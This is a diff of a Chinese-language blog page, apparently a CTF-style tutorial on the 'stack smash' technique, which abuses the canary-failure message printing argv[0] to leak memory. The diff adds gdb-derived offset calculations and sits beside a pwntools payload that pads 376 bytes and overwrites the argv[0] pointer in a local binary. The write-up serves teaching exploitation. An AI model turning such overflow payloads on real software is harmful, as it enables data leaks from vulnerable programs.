@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/5.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/8.png">
 <meta property="og:image" content="https://mi1k7ea.github.com/2019/03/23/花式栈溢出之Stack-smash/7.png">
-<meta property="og:updated_time" content="2019-03-24T14:54:06.976Z">
+<meta property="og:updated_time" content="2019-03-30T15:21:58.705Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="花式栈溢出之Stack smash">
 <meta name="twitter:description" content="Stack smash 在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0] 指针所">
@@ -199,8 +199,9 @@
 <p><strong>Method2——断点调试</strong></p>
 <p>先在main()函数打断点，运行：</p>
 <p><img src="/2019/03/23/花式栈溢出之Stack-smash/8.png" alt=""></p>
-<p>可以看出0x7fffffffe2bd指向程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x7fffffffdf48处保留着该地址，所以我们真正需要的地址是0x7fffffffdf48。</p>
-<p>……</p>
+<p>可以看出0x7fffffffe2bd保存的是程序名，其自然就是 argv[0]，所以我们修改的内容就是这个地址。同时0x7fffffffdf48处保留着该地址，所以我们真正需要覆盖的地址是0x7fffffffdf48。</p>
+<p>此时RBP的地址为0x7fffffffde60；在前面IDA中可以看到变量v8相对于RBP的偏移量为90h，因此可算出v8变量的地址为RBP-90h=0x7fffffffddd0。</p>
+<p>最后可以算出v8变量到需要覆盖的地址的偏移量为：|0x7fffffffddd0 - 0x7fffffffdf48|=178h=376(d)</p>
 <p>编写payload：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./xpl"</span>)</span><br><span class="line">addr = int(sh.recvline().split()[<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">376</span>, p64(addr)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">result = sh.recvall()</span><br><span class="line"><span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>
 <p>运行getflag：</p>
